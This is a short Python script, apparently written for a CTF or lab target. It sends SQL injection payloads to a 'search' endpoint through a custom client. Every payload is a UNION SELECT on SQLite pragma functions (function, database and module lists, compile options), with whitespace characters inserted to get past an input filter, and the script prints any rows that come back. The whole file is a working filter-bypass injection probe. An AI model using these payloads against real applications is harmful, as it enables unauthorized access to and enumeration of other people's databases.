from client import GhostClient

c = GhostClient()
c.bootstrap()

bypasses = [
    "pragma\n_function_list",
    "pragma\r_function_list",
    "pragma\t_function_list",
    "pragma\n_database_list",
    "pragma\n_module_list",
    "pragma\n_compile_options",
]

for b in bypasses:
    q = f"' UNION SELECT 1, 2, 3 FROM {b}--"
    res = c.request("search", {"q": q})
    err = res.get("error") if not res.get("ok") else "OK"
    print(f"{repr(b):35s} -> {err}")
    if res.get("ok"):
        print("  ROWS:", res["data"]["rows"][:3])
